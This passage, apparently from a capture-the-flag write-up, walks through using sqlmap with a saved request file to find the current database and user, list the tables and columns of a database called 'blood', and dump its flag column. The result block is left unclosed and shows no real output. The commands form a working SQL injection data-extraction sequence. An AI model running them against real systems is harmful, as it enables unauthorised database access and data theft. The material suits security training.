Then save to file as **req.txt**

Let's use sqlmap tool with file req.txt

this command for find name of database:

```
sqlmap -r req.txt --current-db
```

this result:

```
4bo@4yman:~/Desktop# sqlmap -r req.txt --current-db

Who is the current db user?

Then we find name of user we can use this command:

```
sqlmap -r req.txt --current-user
```

Then we find name of tables we can use this command:


```
sqlmap -r req.txt -D blood --tables
```

Then we find name of columns we can use this command:


```
sqlmap -r req.txt -D blood -T flag --columns
```

Now we want to find flag to improve the hacking; use this command **--dump**


```
sqlmap -r req.txt -D blood -T flag -C flag --dump
```
